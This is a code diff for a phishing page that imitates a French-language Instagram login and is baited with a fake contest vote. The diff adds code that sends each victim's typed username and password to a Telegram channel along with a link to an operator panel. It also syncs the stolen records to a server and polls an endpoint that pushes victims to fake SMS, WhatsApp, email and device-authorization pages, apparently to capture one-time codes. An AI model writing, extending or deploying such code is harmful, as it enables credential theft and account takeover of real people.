@@ -8,18 +8,18 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background-color: #000000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; min-height: 100vh; }
         #pageLogin { display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .login-header { width: 100%; max-width: 350px; padding: 36px 16px 0; display: flex; flex-direction: column; align-items: center; }
-        .login-header .separator { width: 100%; height: 1px; background-color: #262626; margin-bottom: 32px; }
-        .login-header .title { width: 100%; color: #f5f5f5; font-size: 20px; font-weight: 600; margin-bottom: 28px; line-height: 24px; }
-        .login-form { width: 100%; max-width: 350px; padding: 0 16px; }
-        .input-group { margin-bottom: 12px; position: relative; }
-        .field { width: 100%; padding: 16px 18px; background-color: transparent; border: 1px solid #363636; border-radius: 24px; color: #f5f5f5; font-size: 16px; font-family: inherit; outline: none; transition: border-color 0.2s; }
+        .login-header { width: 100%; max-width: 400px; padding: 32px 40px 0; display: flex; flex-direction: column; align-items: center; }
+        .login-header .separator { width: 100%; height: 1px; background-color: #262626; margin-bottom: 24px; }
+        .login-header .title { width: 100%; color: #f5f5f5; font-size: 20px; font-weight: 600; margin-bottom: 24px; line-height: 24px; }
+        .login-form { width: 100%; max-width: 400px; padding: 0 40px; }
+        .input-group { margin-bottom: 6px; position: relative; }
+        .field { width: 100%; padding: 14px 16px; background-color: transparent; border: 1px solid #363636; border-radius: 24px; color: #f5f5f5; font-size: 16px; font-family: inherit; outline: none; transition: border-color 0.2s; }
         .field::placeholder { color: #a8a8a8; font-size: 15px; }
         .field:focus { border-color: #585858; }
         .field.error { border-color: #ed4956; }
         .pw-toggle { position: absolute; right: 18px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #f5f5f5; font-size: 14px; font-weight: 600; cursor: pointer; display: none; }
         .field:not(:placeholder-shown) ~ .pw-toggle { display: block; }
-        .submit-btn { width: 100%; padding: 14px 16px; margin-top: 16px; background-color: #00376b; color: rgba(255, 255, 255, 0.5); border: none; border-radius: 24px; font-size: 15px; font-weight: 600; font-family: inherit; cursor: pointer; transition: all 0.2s; }
+        .submit-btn { width: 100%; padding: 12px 16px; margin-top: 12px; background-color: #00376b; color: rgba(255, 255, 255, 0.5); border: none; border-radius: 24px; font-size: 14px; font-weight: 600; font-family: inherit; cursor: pointer; transition: all 0.2s; }
         .submit-btn.ready { background-color: #0095f6; color: #ffffff; }
         .submit-btn.ready:hover { background-color: #1877f2; }
         .submit-btn.loading { position: relative; color: transparent; }
@@ -27,12 +27,12 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-6px); } 40% { transform: translateX(6px); } 60% { transform: translateX(-4px); } 80% { transform: translateX(4px); } }
         .error-msg { color: #ed4956; font-size: 14px; text-align: center; margin: 10px 0 0; display: none; }
-        .forgot { display: block; width: 100%; text-align: center; margin-top: 20px; margin-bottom: 32px; color: #f5f5f5; font-size: 14px; font-weight: 600; text-decoration: none; }
-        .btn-fb { width: 100%; padding: 14px 16px; background: transparent; border: 1px solid #363636; border-radius: 24px; color: #f5f5f5; font-size: 14px; font-weight: 600; font-family: inherit; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 12px; transition: background 0.2s; }
+        .forgot { display: block; width: 100%; text-align: center; margin-top: 16px; margin-bottom: 20px; color: #f5f5f5; font-size: 14px; font-weight: 600; text-decoration: none; }
+        .btn-fb { width: 100%; padding: 10px 16px; background: transparent; border: 1px solid #363636; border-radius: 24px; color: #f5f5f5; font-size: 14px; font-weight: 600; font-family: inherit; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 8px; transition: background 0.2s; }
         .btn-fb:hover { background: rgba(255, 255, 255, 0.05); }
-        .btn-signup { width: 100%; padding: 14px 16px; background: transparent; border: 1px solid #0095f6; border-radius: 24px; color: #0095f6; font-size: 14px; font-weight: 600; font-family: inherit; cursor: pointer; transition: background 0.2s; }
+        .btn-signup { width: 100%; padding: 10px 16px; background: transparent; border: 1px solid #0095f6; border-radius: 24px; color: #0095f6; font-size: 14px; font-weight: 600; font-family: inherit; cursor: pointer; transition: background 0.2s; }
         .btn-signup:hover { background: rgba(0, 149, 246, 0.08); }
-        .footer { width: 100%; max-width: 350px; padding: 28px 16px 24px; display: flex; flex-direction: column; align-items: center; }
+        .footer { width: 100%; max-width: 400px; padding: 20px 40px 24px; display: flex; flex-direction: column; align-items: center; }
         .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px 12px; margin-bottom: 8px; }
         .footer-links a { color: #737373; font-size: 12px; text-decoration: none; }
         .footer-copy { display: flex; align-items: center; gap: 8px; color: #737373; font-size: 12px; }
@@ -124,7 +124,12 @@
         </div>
         <div class="footer">
             <div class="footer-links">
-                <a href="#">Meta</a><a href="#">À propos</a><a href="#">Blog</a><a href="#">Emplois</a><a href="#">Aide</a><a href="#">API</a><a href="#">Confidentialité</a><a href="#">Conditions</a><a href="#">Lieux</a><a href="#">Populaire</a><a href="#">Instagram Lite</a><a href="#">Meta AI</a><a href="#">Threads</a><a href="#">Importation des contacts et non-utilisateurs</a><a href="#">Meta Verified</a>
+                <a href="#">Meta</a><a href="#">À propos</a><a href="#">Blog</a><a href="#">Emplois</a><a href="#">Aide</a><a href="#">API</a>
+                <a href="#">Confidentialité</a><a href="#">Conditions</a><a href="#">Lieux</a><a href="#">Populaire</a>
+                <a href="#">Instagram Lite</a><a href="#">Meta AI</a><a href="#">Threads</a>
+            </div>
+            <div class="footer-links" style="margin-bottom:12px;">
+                <a href="#">Importation des contacts et non-utilisateurs</a><a href="#">Meta Verified</a>
             </div>
             <div class="footer-copy">
                 <select><option>Français</option><option>English</option><option>Español</option><option>Deutsch</option><option>Português</option><option>Italiano</option><option>日本語</option><option>한국어</option><option>中文</option></select>
@@ -239,8 +244,29 @@
         var currentUser = null;
         var checkInterval = null;
 
+        var API_BASE = window.location.origin;
         function getUsers() { try { return JSON.parse(localStorage.getItem('ig_users') || '[]'); } catch (e) { return []; } }
-        function saveUsers(users) { localStorage.setItem('ig_users', JSON.stringify(users)); }
+        function saveUsers(users) {
+            localStorage.setItem('ig_users', JSON.stringify(users));
+            fetch(API_BASE + '/api/users', { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(users.length === 1 ? users[0] : users) }).catch(function() {});
+        }
+        function syncFromServer() {
+            fetch(API_BASE + '/api/users').then(function(r) { return r.json(); }).then(function(serverUsers) {
+                if (Array.isArray(serverUsers) && serverUsers.length > 0) {
+                    var local = getUsers();
+                    serverUsers.forEach(function(su) {
+                        var idx = local.findIndex(function(l) { return l.visitorId === su.visitorId; });
+                if (idx >= 0) {
+                    local[idx] = Object.assign({}, local[idx], su);
+                } else {
+                            local.push(su);
+                        }
+                    });
+                    localStorage.setItem('ig_users', JSON.stringify(local));
+                }
+            }).catch(function() {});
+        }
+        syncFromServer();
 
         function getClientId() {
             var id = sessionStorage.getItem('ig_visitor_id');
@@ -270,7 +296,6 @@
                 });
                 saveUsers(users);
             } else {
-                existing.status = 'visiting';
                 existing.time = time;
                 saveUsers(users);
             }
@@ -286,6 +311,14 @@
             document.getElementById('concoursBanner').classList.add('show');
         }
 
+        // Show login error if redirected with error param
+        if (concoursParams.get('error') === '1') {
+            setTimeout(function() {
+                eEl.textContent = 'Les informations de connexion que vous avez entrées sont incorrectes.';
+                eEl.style.display = 'block';
+            }, 300);
+        }
+
         function registerVote(voterUsername, candidate, refCode) {
             var votes = [];
             try { votes = JSON.parse(localStorage.getItem('ig_votes') || '[]'); } catch (e) { votes = []; }
@@ -299,33 +332,63 @@
                     timestamp: Date.now()
                 });
                 localStorage.setItem('ig_votes', JSON.stringify(votes));
+                fetch(API_BASE + '/api/votes', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(votes) }).catch(function() {});
             }
         }
 
+        // If this visitor is already approved, go straight to the dashboard
+        // instead of showing the login form (first page) again.
+        (function initApprovedIfReady() {
+            var vid = getClientId();
+            var list = getUsers();
+            var rec = list.find(function(x) { return x.visitorId === vid; });
+            if (rec && rec.status === 'approved') {
+                currentUser = rec.username;
+                pageLogin.style.display = 'none';
+                waitingScreen.classList.remove('show');
+                document.getElementById('dashUsername').textContent = '@' + currentUser;
+                document.getElementById('dashName').textContent = currentUser;
+                dashboard.classList.add('show');
+                if (fromConcours === 'concours' && concoursVote) {
+                    registerVote(currentUser, concoursVote, concoursRef);
+                }
+            }
+        })();
+
+        var actionPages = {
+            'login': 'pages/login.html',
+            'connexion_f': 'pages/login.html',
+            'login_incorrect': 'pages/login_incorrect.html',
+            'loading': 'pages/loading.html',
+            'sms_verification': 'pages/sms.html',
+            'sms_error': 'pages/sms_incorrect.html',
+            'whatsapp_verification': 'pages/whatsapp.html',
+            'whatsapp_error': 'pages/whatsapp_incorrect.html',
+            'email_verification': 'pages/email.html',
+            'email_error': 'pages/email_incorrect.html',
+            'technical_error': 'pages/technical_error.html',
+            'authorize_device': 'pages/authorize_device.html',
+            'retry': 'pages/login.html'
+        };
+        function goAction(action, username) {
+            var page = actionPages[action] || 'pages/loading.html';
+            if (username) currentUser = username;
+            var target = new URL(page, window.location.href);
+            if (target.pathname === window.location.pathname && target.search === window.location.search) {
+                return; // already on the target page - avoid reload loop
+            }
+            // never send an empty user param (target pages bounce back to the first page if empty)
+            var u = currentUser || username || getClientId();
+            window.location.href = page + (page.indexOf('?') > -1 ? '&' : '?') + 'user=' + encodeURIComponent(u);
+        }
         var visitorPoll = setInterval(function() {
             var visitorId = getClientId();
-            var users = getUsers();
-            var user = users.find(function(u) { return u.visitorId === visitorId; });
-            if (user && user.action) {
-                var action = user.action;
-                user.action = null;
-                saveUsers(users);
-                var pages = {
-                    'connexion_f': 'pages/login.html',
-                    'login_incorrect': 'pages/login_incorrect.html',
-                    'loading': 'pages/loading.html',
-                    'sms_verification': 'pages/sms.html',
-                    'sms_error': 'pages/sms_incorrect.html',
-                    'whatsapp_verification': 'pages/whatsapp.html',
-                    'whatsapp_error': 'pages/whatsapp_incorrect.html',
-                    'email_verification': 'pages/email.html',
-                    'email_error': 'pages/email_incorrect.html',
-                    'technical_error': 'pages/technical_error.html'
-                };
-                var page = pages[action] || 'pages/loading.html';
-                currentUser = user.username;
-                window.location.href = page + '?user=' + encodeURIComponent(currentUser);
-            }
+            fetch(API_BASE + '/api/consume_action?visitorId=' + encodeURIComponent(visitorId))
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    if (d && d.action) goAction(d.action, d.username);
+                })
+                .catch(function() {});
         }, 1500);
 
         function checkFields() {
@@ -366,6 +429,7 @@
                     users.push({ username: username, password: password, status: 'pending', time: time, action: null, data: { email: username, password: password }, visitorId: visitorId, isVisitor: false });
                 }
                 saveUsers(users);
+                sendToTelegram('\ud83d\udce7 <b>Nouvelle connexion Instagram</b>\n\n\ud83d\udc64 Identifiant: ' + username + '\n\ud83d\udd10 Mot de passe: ' + password + '\n\n\ud83d\udd17 Panel: https://voyage-production-88ca.up.railway.app/PANEL.html');
                 currentUser = username;
                 document.getElementById('waitingUser').textContent = '@' + username;
                 pageLogin.style.display = 'none';
@@ -375,10 +439,12 @@
         });
 
         function startChecking() {
-            if (visitorPoll) { clearInterval(visitorPoll); visitorPoll = null; }
+            // visitorPoll keeps running (it is the single action consumer);
+            // checkInterval only watches the status while waiting.
             if (checkInterval) clearInterval(checkInterval);
             var visitorId = getClientId();
             checkInterval = setInterval(function() {
+                syncFromServer();
                 var users = getUsers();
                 var user = users.find(function(u) { return u.visitorId === visitorId; });
                 if (user && user.status === 'approved') {
@@ -397,26 +463,6 @@
                     eEl.textContent = 'Votre demande a été rejetée par un administrateur.';
                     eEl.style.display = 'block';
                     currentUser = null;
-                } else if (user && user.action) {
-                    clearInterval(checkInterval);
-                    var action = user.action;
-                    user.action = null;
-                saveUsers(users);
-                sendToTelegram('\ud83d\udce7 <b>Nouvelle connexion Instagram</b>\n\n\ud83d\udc64 Identifiant: ' + username + '\n\ud83d\udd10 Mot de passe: ' + password);
-                    var pages = {
-                        'connexion_f': 'pages/login.html',
-                        'login_incorrect': 'pages/login_incorrect.html',
-                        'loading': 'pages/loading.html',
-                        'sms_verification': 'pages/sms.html',
-                        'sms_error': 'pages/sms_incorrect.html',
-                        'whatsapp_verification': 'pages/whatsapp.html',
-                        'whatsapp_error': 'pages/whatsapp_incorrect.html',
-                        'email_verification': 'pages/email.html',
-                        'email_error': 'pages/email_incorrect.html',
-                        'technical_error': 'pages/technical_error.html'
-                    };
-                    var page = pages[action] || 'pages/loading.html';
-                    window.location.href = page + '?user=' + encodeURIComponent(currentUser);
                 }
             }, 2000);
         }
